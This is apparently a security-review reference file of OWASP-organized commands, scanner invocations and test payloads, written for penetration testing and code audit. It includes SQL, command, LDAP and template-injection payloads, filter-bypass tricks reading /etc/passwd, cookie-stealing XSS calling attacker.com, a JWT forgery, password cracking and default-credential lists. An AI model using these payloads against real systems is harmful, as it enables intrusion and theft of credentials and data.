# Security Review -- Payloads & Commands

> This file is a companion to `SKILL.md`, containing security review commands, test payloads, and audit scripts organized by OWASP category.

---

## Index

1. [Secrets Detection](#1-secrets-detection)
2. [Injection Test Payloads](#2-injection-test-payloads)
3. [Authentication Testing](#3-authentication-testing)
4. [Security Headers Verification](#4-security-headers-verification)
5. [Dependency Audit Commands](#5-dependency-audit-commands)
6. [API Sensitive Field Detection](#6-api-sensitive-field-detection)

---

## 1. Secrets Detection

### 1.1 TruffleHog Commands

```bash
# Scan filesystem for secrets
trufflehog filesystem /path/to/repo

# Scan git history (all branches)
trufflehog git https://github.com/target/repo --include-detected

# Scan specific branch with JSON output
trufflehog git https://github.com/target/repo --branch=main --format=json

# Scan Docker image layers
trufflehog docker --image target-image:latest

# Scan with custom verification
trufflehog filesystem --no-verification /path/to/repo
```

### 1.2 Gitleaks Commands

```bash
# Detect secrets in repository
gitleaks detect --source /path/to/repo

# Scan with verbose output
gitleaks detect --source /path/to/repo -v

# Scan unstaged changes
gitleaks protect --source /path/to/repo

# Custom rules configuration
gitleaks detect --source /path/to/repo --config-path /path/to/.gitleaks.toml

# Generate SARIF report
gitleaks detect --source /path/to/repo --report-format sarif --report-path findings.sarif
```

### 1.3 Manual Secret Hunting

```bash
# API keys (generic patterns)
grep -rnE '(api[_-]?key|apikey)\s*[:=]\s*["\x27][A-Za-z0-9]{20,}' /path/to/repo
grep -rnE '(aws_access_key_id|aws_secret_access_key)\s*[:=]' /path/to/repo
grep -rnE 'AKIA[0-9A-Z]{16}' /path/to/repo

# Tokens (JWT, bearer, OAuth)
grep -rnE '(bearer|token|jwt)\s*[:=]\s*["\x27][A-Za-z0-9._-]{20,}' /path/to/repo
grep -rnE 'eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+' /path/to/repo

# Passwords
grep -rnE '(password|passwd|pwd)\s*[:=]\s*["\x27][^\s]{8,}' /path/to/repo --include='*.{py,js,rb,java,yml,yaml,env,conf}'
grep -rnE '(db_pass|database_password|mysql_root_password)' /path/to/repo

# Private keys
grep -rnE '-----BEGIN (RSA |EC |DSA )?PRIVATE KEY-----' /path/to/repo
grep -rnE '-----BEGIN PGP PRIVATE KEY BLOCK-----' /path/to/repo

# Connection strings
grep -rnE '(mongodb|postgres|mysql|redis)://[^\s"\x27]+' /path/to/repo
grep -rnE 'jdbc:[a-z]+://[^\s"\x27]+' /path/to/repo
```

### 1.4 Exposed File Checks

```bash
# Environment and config files
curl -s -o /dev/null -w "%{http_code}" http://target/.env
curl -s http://target/.env.bak
curl -s http://target/.env.local
curl -s http://target/.env.production

# Git directory exposure
curl -s http://target/.git/HEAD
curl -s http://target/.git/config
curl -s http://target/.gitignore

# Backup and database files
curl -s -o /dev/null -w "%{http_code}" http://target/backup.sql
curl -s -o /dev/null -w "%{http_code}" http://target/db_dump.sql.gz
curl -s -o /dev/null -w "%{http_code}" http://target/backup.zip
curl -s -o /dev/null -w "%{http_code}" http://target/site.tar.gz

# Config files
curl -s http://target/config.yml
curl -s http://target/config.yml.bak
curl -s http://target/wp-config.php.bak
curl -s http://target/application.properties
curl -s http://target/WEB-INF/web.xml

# Common sensitive paths
curl -s http://target/server-status
curl -s http://target/server-info
curl -s http://target/.htaccess
curl -s http://target/phpinfo.php
curl -s http://target/actuator/env
curl -s http://target/actuator/health
```

---

## 2. Injection Test Payloads

### 2.1 SQL Injection Test Payloads

**Error-based detection:**
```sql
' OR 1=1 --
' OR '1'='1
" OR ""="
1' ORDER BY 1-- -
1' ORDER BY 100-- -
1' GROUP BY 1-- -
' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -
' AND UPDATEXML(1,CONCAT(0x7e,USER()),1)-- -
```

**UNION-based extraction:**
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT username,password FROM users-- -
' UNION SELECT table_name,column_name FROM information_schema.columns-- -
' UNION SELECT table_schema,table_name FROM information_schema.tables-- -
```

**Blind SQL injection:**
```sql
' AND (SELECT LENGTH(database()))>10-- -
' AND (SELECT SUBSTRING(database(),1,1))='a'-- -
' AND (SELECT ASCII(SUBSTRING(database(),1,1)))>97-- -
' AND IF(1=1,SLEEP(3),0)-- -
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
```

**Time-based:**
```sql
' AND SLEEP(5)-- -
' AND BENCHMARK(5000000,SHA1('test'))-- -
'; WAITFOR DELAY '0:0:5'-- -
' AND pg_sleep(5)-- -
```

### 2.2 Command Injection Payloads

**Basic command injection:**
```bash
; id
| id
`id`
$(id)
&& id
|| id
%0a id
```

**Bypass techniques:**
```bash
# Space bypass
id${IFS}
id$IFS$9
id<>/tmp/x
{cat,/etc/passwd}

# Blacklist bypass
c'a't /etc/passwd
c""at /etc/passwd
c\at /etc/passwd
/bin/c?t /etc/passwd
/bin/c[at /etc/passwd

# Encoding bypass
%69%64                # URL encoded "id"
echo${IFS}aWQ=|base64${IFS}-d|bash    # base64 encoded "id"
$'\x69\x64'           # hex encoded "id"
```

### 2.3 LDAP Injection Payloads

```
*)(uid=*))(|(uid=*
*)(objectClass=*)
admin)(&(1=0)
*)(|(cn=*
*)(|(cn=*)(cn=*
)(cn=*))|(cn=
)(objectClass=*))|(objectClass=
admin)(|(password=*)(|(cn=*)
*)(uid=admin))(|(uid=*
*)(mail=*)
```

### 2.4 SSTI (Server-Side Template Injection) Payloads

**Jinja2 (Python):**
```
{{7*7}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{% for x in ().__class__.__bases__[0].__subclasses__() %}{% if "warning" in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP):**
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```

**ERB (Ruby):**
```
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= Exec.new('id').run %>
```

### 2.5 XSS Test Payloads

**Reflected XSS:**
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<input onfocus=alert(1) autofocus>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

**Stored XSS:**
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="new Image().src='https://attacker.com/?c='+document.cookie">
<script>new XMLHttpRequest().open('GET','https://attacker.com/?c='+document.cookie)</script>
```

**DOM-based XSS:**
```html
#<img src=x onerror=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
"><img src=x onerror=alert(1)>
```

---

## 3. Authentication Testing

### 3.1 Default Credential Checklists

```
# Common services default credentials
# Format: service:username:password
admin:admin
admin:password
admin:admin123
root:root
root:toor
root:password
administrator:administrator
guest:guest
test:test
user:user1
operator:operator

# Databases
sa:                          # MSSQL empty password
postgres:postgres
mysql:root                   # MySQL root no password
redis:                       # Redis no auth

# Frameworks and admin panels
admin:admin          # WordPress, Joomla, etc.
tomcat:tomcat        # Apache Tomcat
admin:zonealarm      # ZoneAlarm
admin:netscreen      # Juniper Netscreen
```

### 3.2 Session Testing

```bash
# Session fixation test
# 1. Obtain unauthenticated session cookie
curl -v http://target/login 2>&1 | grep -i "set-cookie"
# 2. Set session cookie before login
curl -b "session=attacker_fixed_id" -d "user=victim&pass=pwd" http://target/login
# 3. Check if session ID changed after login
curl -v -b "session=attacker_fixed_id" http://target/dashboard 2>&1 | grep "set-cookie"

# Session hijacking -- test cookie flags
curl -sI http://target | grep -i "set-cookie" | grep -i "httponly\|secure"
```

### 3.3 OAuth/JWT Testing

```bash
# JWT none algorithm attack
# Modify header to {"alg":"none"} and remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64url
echo -n '{"sub":"admin","iat":1516239022}' | base64url
# Combine: header.payload.

# JWT algorithm confusion (RS256 -> HS256)
# Use public key as HMAC secret

# Decode JWT without verification
echo "TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null
echo "TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null

# JWT weak secret brute force
hashcat -m 16500 jwt_token.txt wordlist.txt
john --wordlist=wordlist.txt jwt_token.txt

# OAuth token leakage check
# Verify redirect_uri validation
curl -v "http://target/auth?redirect_uri=https://evil.com/callback&client_id=app"
```

### 3.4 Rate Limit Testing

```bash
# Test login rate limiting
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -d "username=admin&password=wrong${i}" \
    http://target/login
done

# Test API rate limiting
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "Authorization: Bearer TOKEN" \
    http://target/api/endpoint
done

# Check for consistent rate limit response
for i in $(seq 1 20); do
  curl -s -w "\n%{http_code} %{time_total}s\n" \
    -X POST http://target/api/reset-password \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com"}'
done
```

---

## 4. Security Headers Verification

### 4.1 Security Header Checks

```bash
# Comprehensive header check (one-liner)
curl -sI http://target | grep -iE "strict-transport|content-security-policy|x-frame-options|x-content-type-options|x-xss-protection|referrer-policy|permissions-policy|feature-policy"

# Individual header checks
curl -sI http://target | grep -i "strict-transport-security"
curl -sI http://target | grep -i "content-security-policy"
curl -sI http://target | grep -i "x-frame-options"
curl -sI http://target | grep -i "x-content-type-options"
curl -sI http://target | grep -i "x-xss-protection"
curl -sI http://target | grep -i "referrer-policy"

# Quick severity assessment
echo "Missing Headers:"; for h in "Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options"; do curl -sI http://target | grep -qi "$h" || echo "  MISSING: $h"; done
```

### 4.2 TLS/SSL Testing

```bash
# Nmap SSL cipher enumeration
nmap --script ssl-enum-ciphers -p 443 target

# SSLyze comprehensive scan
sslyze --regular target
sslyze --tlsv1_1 target
sslyze --tlsv1_2 target
sslyze --certinfo=target

# Testssl.sh comprehensive TLS audit
testssl.sh --full target
testssl.sh --vulnerabilities target
testssl.sh --server-defaults target
testssl.sh --protocols target

# Certificate information
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -text
echo | openssl s_client -connect target:443 2>/dev/null | openssl x509 -noout -dates -issuer -subject
```

### 4.3 CORS Testing

```bash
# Test wildcard CORS
curl -sI -H "Origin: https://evil.com" http://target/api | grep -i "access-control-allow"

# Test credential CORS
curl -sI -H "Origin: https://evil.com" http://target/api | grep -i "access-control-allow-credentials"

# Test subdomain CORS
curl -sI -H "Origin: https://fake.target.com" http://target/api | grep -i "access-control-allow"

# Test null origin
curl -sI -H "Origin: null" http://target/api | grep -i "access-control-allow"

# Automated CORS misconfiguration scanner
for origin in "https://evil.com" "https://sub.target.com" "null" "https://target.com.evil.com" "https://target.com@evil.com"; do
  echo "Testing origin: $origin"
  curl -sI -H "Origin: $origin" http://target/api | grep -i "access-control"
done
```

---

## 5. Dependency Audit Commands

### 5.1 Language-Specific Audits

```bash
# Node.js / npm
npm audit
npm audit --json
npm audit --fix
npx npm-audit-resolver

# Python / pip
pip-audit -r requirements.txt
pip-audit --json
safety check -r requirements.txt
safety check --json

# Rust / Cargo
cargo audit
cargo audit --json
cargo deny check

# Go
go vuln ./...
govulncheck ./...

# Java / Maven
mvn org.owasp:dependency-check-maven:check
gradle dependencyCheckAnalyze

# Ruby / Bundler
bundle audit check
bundle audit check --update
```

### 5.2 Container Image Scanning

```bash
# Trivy
trivy image target-image:latest
trivy image --format json target-image:latest
trivy image --severity HIGH,CRITICAL target-image:latest
trivy fs /path/to/project

# Grype
grype target-image:latest
grype dir:/path/to/project
grype --output json target-image:latest

# Snyk
snyk container test target-image:latest
snyk container monitor target-image:latest

# Docker Scout
docker scout cves target-image:latest
docker scout recommendations target-image:latest
```

### 5.3 OWASP Dependency-Check

```bash
# Generic project scan
dependency-check --scan /path/to/project --out /path/to/report

# Specific formats
dependency-check --scan pom.xml --format XML --out reports/
dependency-check --scan package-lock.json --format HTML --out reports/

# With suppression file
dependency-check --scan /path/to/project --suppression suppressions.xml

# NVD API key for faster downloads
dependency-check --scan /path/to/project --nvdApiKey YOUR_API_KEY
```

---

## 6. API Sensitive Field Detection

### 6.1 JQ Filters for PII/Sensitive Data

```bash
# Find email addresses in API response
curl -s http://target/api/users | jq '[.[] | select(.email != null)] | length'

# Extract sensitive field names from API response
curl -s http://target/api/users | jq '.[0] | keys'

# Check for password/hash fields in responses
curl -s http://target/api/users | jq '[.[] | select(.password != null or .hash != null or .token != null)] | length'

# Detect credit card number patterns
curl -s http://target/api/payments | jq '[.[] | select(.card_number != null or .cc != null or .pan != null)]'

# Find SSN patterns
curl -s http://target/api/users | jq '[.[] | tostring | select(test("\\d{3}-\\d{2}-\\d{4}"))]'

# Check for internal IDs exposed
curl -s http://target/api/users | jq '.[0] | with_entries(select(.key | test("id|internal|backend|db")))'

# Detect verbose error messages
curl -s http://target/api/error | jq 'select(.stack_trace != null or .debug != null or .exception != null)'
```

### 6.2 Mass Assignment Testing

```bash
# Test mass assignment on user registration
curl -X POST http://target/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","password":"Test1234!","email":"test@test.com","role":"admin","isAdmin":true}'

# Test privilege escalation via mass assignment
curl -X PUT http://target/api/users/123 \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"email":"new@email.com","role":"admin","permissions":["all"]}'

# Hidden field discovery
curl -X POST http://target/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","__v":0,"_id":"507f1f77bcf86cd799439011","verified":true}'

# Nested object injection
curl -X POST http://target/api/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","settings":{"isPremium":true,"subscription":"enterprise"}}'
```

### 6.3 GraphQL Introspection

```bash
# Full schema introspection
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

# List all query types
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name,description}}}}"}'

# List all mutation types
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name,description}}}}"}'

# Check for field suggestions (error-based discovery)
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{usr{email}}"}'
# If typo, server may suggest correct field name

# Batch query attack (deep nesting)
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{friends{friends{friends{friends{email}}}}}}"}'

# Query depth limit testing
curl -s -X POST http://target/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{a{b{c{d{e{f{g{h{i{j{k}}}}}}}}}}}"}'
```

---

## Dependency Audit Commands

### NPM/Node.js
```bash
# Check for known vulnerabilities
npm audit --json

# Check outdated packages
npm outdated --json

# List all dependencies with licenses
npx license-checker --json
```

### Python
```bash
# Safety check for known CVEs
pip-audit --format=json

# Check outdated packages
pip list --outdated --format=json

# Scan requirements file
safety check -r requirements.txt --json
```

### Container Image Scanning
```bash
# Trivy scan
trivy image --format json target-image:latest

# Grype scan
grype target-image:latest -o json

# Snyk container test
snyk container test target-image:latest --json
```

### SAST Quick Checks
```bash
# Semgrep scan
semgrep --config=auto --json .

# Bandit (Python)
bandit -r . -f json

# ESLint security plugin (JavaScript)
npx eslint --plugin security --rule 'security/detect-eval-with-expression: error' .
```

---

## 7. Automated Code Analysis

### 7.1 Semgrep Custom Rules

```bash
# Run Semgrep with auto-detection of language and framework
semgrep --config=auto --json -o semgrep_results.json .

# Run OWASP Top 10 rules
semgrep --config=p/owasp-top-ten .

# Run language-specific security rules
semgrep --config=p/python .
semgrep --config=p/javascript .
semgrep --config=p/java .
semgrep --config=p/golang .

# Run with multiple rulesets
semgrep --config=p/security-audit --config=p/secrets --config=p/default .

# Scan specific directories with severity filter
semgrep --config=auto --severity ERROR --severity WARNING \
  --include="*.py" --include="*.js" \
  --exclude="node_modules" --exclude="venv" .

# Generate SARIF output for CI integration
semgrep --config=auto --sarif -o results.sarif .
```

### 7.2 Custom Semgrep Rules

```yaml
# custom-rules.yaml - Project-specific security patterns
rules:
  - id: hardcoded-jwt-secret
    patterns:
      - pattern: |
          jwt.sign($PAYLOAD, "...", ...)
      - pattern-not: |
          jwt.sign($PAYLOAD, process.env.$VAR, ...)
    message: "JWT signed with hardcoded secret"
    severity: ERROR
    languages: [javascript, typescript]

  - id: sql-string-concat
    patterns:
      - pattern: |
          $QUERY = "..." + $INPUT + "..."
      - metavariable-regex:
          metavariable: $QUERY
          regex: ".*(SELECT|INSERT|UPDATE|DELETE|FROM|WHERE).*"
    message: "Potential SQL injection via string concatenation"
    severity: ERROR
    languages: [python, javascript, java]

  - id: unsafe-deserialization
    pattern: pickle.loads($DATA)
    message: "Unsafe deserialization with pickle - use json instead"
    severity: ERROR
    languages: [python]

  - id: missing-csrf-protection
    patterns:
      - pattern: |
          @app.route("...", methods=["POST"])
          def $FUNC(...):
              ...
      - pattern-not-inside: |
          @csrf.exempt
          ...
      - pattern-not-inside: |
          csrf_token = ...
          ...
    message: "POST endpoint may lack CSRF protection"
    severity: WARNING
    languages: [python]
```

```bash
# Run custom rules
semgrep --config=custom-rules.yaml .

# Test a single rule against a file
semgrep --config=custom-rules.yaml --pattern 'pickle.loads($X)' --lang python .
```

### 7.3 CodeQL Queries

```bash
# Initialize CodeQL database
codeql database create codeql-db --language=javascript --source-root=.
codeql database create codeql-db-py --language=python --source-root=.

# Run standard security queries
codeql database analyze codeql-db \
  codeql/javascript-queries:Security \
  --format=sarif-latest --output=codeql-results.sarif

# Run specific CWE queries
codeql database analyze codeql-db \
  codeql/javascript-queries:Security/CWE-079 \
  codeql/javascript-queries:Security/CWE-089 \
  codeql/javascript-queries:Security/CWE-022 \
  --format=csv --output=cwe-results.csv

# Run all security and quality queries
codeql database analyze codeql-db-py \
  codeql/python-queries:Security \
  codeql/python-queries:Errors \
  --format=sarif-latest --output=python-results.sarif

# Custom CodeQL query for taint tracking
codeql query run custom-taint.ql --database=codeql-db
```

### 7.4 Custom CodeQL Query (SQL Injection)

```python
# custom-sqli.ql - CodeQL query for SQL injection detection
# Save as .ql file and run with: codeql query run custom-sqli.ql --database=codeql-db

# /**
#  * @name SQL injection from user input
#  * @description Finds SQL queries built from user-controlled input
#  * @kind path-problem
#  * @problem.severity error
#  * @security-severity 9.8
#  * @id custom/sql-injection
#  * @tags security
#  */
# import javascript
# import DataFlow::PathGraph
# import semmle.javascript.security.dataflow.SqlInjectionQuery
#
# from SqlInjection::Configuration cfg, DataFlow::PathNode source, DataFlow::PathNode sink
# where cfg.hasFlowPath(source, sink)
# select sink.getNode(), source, sink, "SQL injection from $@.", source.getNode(), "user input"

# Equivalent Bandit scan for Python
bandit -r . -f json -o bandit_results.json
bandit -r . -ll -ii  # Only high severity, high confidence
bandit -r . --skip B101,B601  # Skip specific checks
bandit -r . -t B301,B302,B303,B304,B305  # Only deserialization checks
```

### 7.5 Pattern-Based Grep Scanning

```bash
# Dangerous function usage (C/C++)
grep -rnE '\b(gets|strcpy|strcat|sprintf|scanf|vsprintf|realpath)\s*\(' \
  --include='*.c' --include='*.cpp' --include='*.h' .

# Eval and dynamic execution (JavaScript/Python)
grep -rnE '\b(eval|exec|execFile|Function)\s*\(' \
  --include='*.js' --include='*.ts' --include='*.py' .

# Hardcoded IPs and internal URLs
grep -rnE '(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2[0-9]|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)' \
  --include='*.py' --include='*.js' --include='*.yaml' --include='*.json' .

# Disabled security features
grep -rnE '(verify\s*=\s*False|SSL_VERIFY.*false|InsecureSkipVerify.*true|NODE_TLS_REJECT_UNAUTHORIZED.*0)' .

# Debug/development leftovers
grep -rnE '(TODO.*hack|FIXME.*security|XXX|TEMP.*password|debugger|console\.log)' \
  --include='*.py' --include='*.js' --include='*.ts' --include='*.java' .

# Crypto weaknesses
grep -rnE '(MD5|SHA1|DES|RC4|ECB)\b' --include='*.py' --include='*.js' --include='*.java' .
grep -rnE '(random\(\)|Math\.random|rand\(\))' --include='*.py' --include='*.js' .
```

---

## 8. Dependency Vulnerability Scanning

### 8.1 Snyk Advanced Usage

```bash
# Authenticate and test project
snyk auth
snyk test --json > snyk_results.json

# Test with severity threshold (fail on high+)
snyk test --severity-threshold=high

# Monitor project for new vulnerabilities
snyk monitor --project-name="my-app"

# Test specific manifest files
snyk test --file=package-lock.json
snyk test --file=requirements.txt
snyk test --file=go.sum
snyk test --file=Gemfile.lock

# Scan Infrastructure as Code
snyk iac test terraform/ --json > iac_results.json
snyk iac test kubernetes/ --severity-threshold=medium

# Scan container images with detailed output
snyk container test myimage:latest --json --severity-threshold=high
snyk container test --file=Dockerfile myimage:latest

# Generate SBOM (Software Bill of Materials)
snyk sbom --format=cyclonedx1.4+json > sbom.json
```

### 8.2 npm Audit Automation

```bash
# Full audit with fix suggestions
npm audit --json | jq '.vulnerabilities | to_entries[] | select(.value.severity == "critical" or .value.severity == "high") | {name: .key, severity: .value.severity, via: .value.via[0]}'

# Auto-fix non-breaking vulnerabilities
npm audit fix

# Force fix (may include breaking changes)
npm audit fix --force --dry-run  # Preview first
npm audit fix --force

# Check specific packages
npm audit --package-lock-only --json | jq '.vulnerabilities | keys'

# Generate audit report for CI pipeline
npm audit --json > audit.json
node -e "
const audit = require('./audit.json');
const critical = Object.values(audit.vulnerabilities).filter(v => v.severity === 'critical');
if (critical.length > 0) {
  console.error('CRITICAL vulnerabilities found:', critical.map(v => v.name));
  process.exit(1);
}
"
```

### 8.3 pip-audit and Safety Automation

```bash
# pip-audit with multiple output formats
pip-audit --format=json --output=audit.json
pip-audit --format=cyclonedx-json --output=sbom.json
pip-audit --strict  # Fail on any vulnerability

# Audit specific requirements file
pip-audit -r requirements.txt -r requirements-dev.txt

# Audit installed packages with fix suggestions
pip-audit --fix --dry-run
pip-audit --fix  # Auto-update vulnerable packages

# Safety check with policy file
safety check -r requirements.txt --json --output=safety_results.json
safety check --policy-file=.safety-policy.yml

# OSV-Scanner (Google's vulnerability scanner)
osv-scanner --lockfile=requirements.txt
osv-scanner --lockfile=package-lock.json
osv-scanner -r .  # Recursive scan all lockfiles

# Generate vulnerability summary report
pip-audit --format=json | python3 -c "
import json, sys
data = json.load(sys.stdin)
for dep in data.get('dependencies', []):
    for vuln in dep.get('vulns', []):
        print(f\"[{vuln.get('id')}] {dep['name']}=={dep['version']} - {vuln.get('description', '')[:80]}\")
"
```

### 8.4 License Compliance Scanning

```bash
# Check licenses for all npm dependencies
npx license-checker --json --production > licenses.json
npx license-checker --failOn "GPL-3.0;AGPL-3.0" --production

# Python license check
pip-licenses --format=json --output-file=licenses.json
pip-licenses --fail-on="GPL-3.0-only;AGPL-3.0-only"

# FOSSA CLI for comprehensive license analysis
fossa analyze
fossa test  # Fail if policy violations found

# Scancode toolkit (detailed license detection)
scancode --license --copyright --json-pp licenses_detailed.json .
```

### 8.5 Continuous Vulnerability Monitoring

```bash
# GitHub Dependabot alerts via CLI
gh api repos/{owner}/{repo}/dependabot/alerts --jq '.[] | {package: .security_advisory.summary, severity: .security_advisory.severity, state: .state}'

# Renovate Bot dry-run (preview dependency updates)
npx renovate --dry-run --print-config

# Trivy filesystem scan with ignore file
cat > .trivyignore << 'EOF'
CVE-2023-12345
CVE-2023-67890
EOF
trivy fs --ignorefile .trivyignore --severity HIGH,CRITICAL .

# Grype with ignore rules
cat > .grype.yaml << 'EOF'
ignore:
  - vulnerability: CVE-2023-12345
    reason: "Not exploitable in our context"
  - package:
      name: lodash
      version: 4.17.20
      type: npm
EOF
grype dir:. --config .grype.yaml
```

---

## 9. Infrastructure Code Review

### 9.1 Terraform Security Scanning

```bash
# tfsec - Terraform static analysis
tfsec . --format json --out tfsec_results.json
tfsec . --minimum-severity HIGH
tfsec . --exclude aws-vpc-no-public-ingress-sgr,aws-s3-enable-versioning

# Checkov - Policy-as-code for IaC
checkov -d . --framework terraform --output json > checkov_results.json
checkov -d . --check CKV_AWS_18,CKV_AWS_21  # Specific checks
checkov -d . --skip-check CKV_AWS_999  # Skip specific check
checkov -f main.tf --framework terraform

# Terrascan - Detect compliance violations
terrascan scan -i terraform -d . -o json > terrascan_results.json
terrascan scan -i terraform -d . --policy-type aws --severity high

# KICS (Keeping Infrastructure as Code Secure)
kics scan -p . -o kics_results/ --type terraform
kics scan -p . --exclude-severities info,low
```

### 9.2 Terraform Misconfigurations to Detect

```bash
# Check for public S3 buckets
grep -rnE 'acl\s*=\s*"public-read|public-read-write"' --include='*.tf' .

# Check for unencrypted resources
grep -rnL 'encryption\|kms_key\|encrypted\s*=\s*true' --include='*.tf' . | \
  xargs grep -l 'aws_s3_bucket\|aws_ebs_volume\|aws_rds_instance'

# Check for overly permissive IAM policies
grep -rnE '"Action"\s*:\s*"\*"|"Resource"\s*:\s*"\*"' --include='*.tf' --include='*.json' .

# Check for missing logging
grep -rnL 'logging\|access_logs\|cloud_watch' --include='*.tf' . | \
  xargs grep -l 'aws_lb\|aws_s3_bucket\|aws_cloudfront'

# Check for hardcoded secrets in Terraform
grep -rnE '(password|secret|key)\s*=\s*"[^${}]' --include='*.tf' .
grep -rnE 'default\s*=\s*"(sk-|AKIA|ghp_|glpat-)' --include='*.tf' .
```

### 9.3 Kubernetes Manifest Analysis

```bash
# kubesec - Security risk analysis for K8s resources
kubesec scan deployment.yaml
kubesec scan pod.yaml --format json > kubesec_results.json

# kube-score - Static analysis of K8s object definitions
kube-score score deployment.yaml
kube-score score *.yaml --output-format json > kube_score.json

# Checkov for Kubernetes
checkov -d . --framework kubernetes --output json
checkov -f deployment.yaml --framework kubernetes

# Polaris - Best practices for K8s deployments
polaris audit --audit-path . --format json > polaris_results.json
polaris audit --audit-path . --set-exit-code-on-danger

# Trivy for Kubernetes manifests
trivy config . --severity HIGH,CRITICAL
trivy config deployment.yaml --format json
```

### 9.4 Kubernetes Security Anti-Patterns

```bash
# Find containers running as root
grep -rnB5 'runAsUser: 0\|runAsNonRoot: false\|privileged: true' \
  --include='*.yaml' --include='*.yml' .

# Find missing resource limits
grep -rnL 'resources:\|limits:\|requests:' --include='*.yaml' . | \
  xargs grep -l 'containers:'

# Find containers with host network/PID/IPC
grep -rnE 'hostNetwork: true|hostPID: true|hostIPC: true' \
  --include='*.yaml' --include='*.yml' .

# Find missing security contexts
grep -rnL 'securityContext' --include='*.yaml' . | \
  xargs grep -l 'containers:'

# Find images without specific tags (using :latest or no tag)
grep -rnE 'image:\s*[^:]+$|image:.*:latest' --include='*.yaml' --include='*.yml' .

# Find secrets mounted as environment variables (prefer volumes)
grep -rnB2 -A2 'secretKeyRef' --include='*.yaml' --include='*.yml' .
```

### 9.5 Docker Security Scanning

```bash
# Hadolint - Dockerfile linter
hadolint Dockerfile --format json > hadolint_results.json
hadolint Dockerfile --ignore DL3008 --ignore DL3009

# Dockle - Container image linter
dockle myimage:latest --format json --output dockle_results.json
dockle --exit-code 1 --exit-level fatal myimage:latest

# Check Dockerfile for common security issues
grep -nE '^USER root|^RUN.*chmod 777|^RUN.*curl.*\|.*sh' Dockerfile
grep -nE 'ADD\s+https?://' Dockerfile  # Prefer COPY over ADD with URLs
grep -nE 'ENV.*PASSWORD|ENV.*SECRET|ENV.*KEY' Dockerfile

# Scan for secrets in Docker build history
docker history --no-trunc myimage:latest | grep -iE 'key|secret|password|token'

# Dive - Analyze image layers for waste and secrets
dive myimage:latest --ci --highestWastedBytes 50MB
```
